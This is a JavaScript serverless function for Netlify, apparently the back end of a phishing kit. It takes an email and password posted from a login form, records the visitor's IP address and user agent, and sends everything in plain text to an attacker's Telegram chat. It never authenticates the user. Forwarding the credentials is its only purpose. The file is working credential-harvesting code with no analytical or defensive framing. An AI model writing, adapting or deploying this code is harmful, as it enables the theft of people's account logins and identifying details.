exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: '' };
  }

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) {
    return { statusCode: 500, body: JSON.stringify({ ok: false, error: 'Missing env vars' }) };
  }

  let body;
  try {
    body = JSON.parse(event.body || '{}');
  } catch {
    return { statusCode: 400, body: JSON.stringify({ ok: false, error: 'Invalid JSON' }) };
  }

  const { email, password } = body;
  if (!email || !password) {
    return { statusCode: 400, body: JSON.stringify({ ok: false, error: 'Missing email or password' }) };
  }

  // Extract real IP and user agent from Netlify headers
  const clientIp = event.headers['x-forwarded-for'] || event.headers['client-ip'] || 'unknown';
  const userAgent = event.headers['user-agent'] || 'unknown';

  const text = `🔐 Login\nEmail: ${email}\nPassword: ${password}\nUser-Agent: ${userAgent}\nIP Address: ${clientIp}`;

  try {
    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text }),
    });
    const data = await res.json();
    if (!data.ok) {
      return { statusCode: 502, body: JSON.stringify({ ok: false, error: 'Telegram API error' }) };
    }
    return { statusCode: 200, body: JSON.stringify({ ok: true }) };
  } catch (err) {
    return { statusCode: 500, body: JSON.stringify({ ok: false, error: String(err.message) }) };
  }
};
